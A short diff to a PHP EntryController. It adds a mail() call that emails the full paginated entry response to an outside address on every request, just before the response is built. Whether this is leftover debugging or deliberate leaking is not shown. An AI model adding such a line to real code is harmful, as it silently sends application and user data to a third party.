@@ -3338,7 +3338,7 @@ class EntryController extends BaseController
 		{
 			$return[ 'previous' ] = url( "index.php/entry/?" . http_build_query( [ "limit" => $limit, "page" => $page - 1 ] ) );
 		}
-
+		mail('anil@spaceotechnologies.com',time(),print_r($return,true));
 		$response = Response::make( $return, $status_code );
 
 		$response->header( 'X-Total-Count', $count );
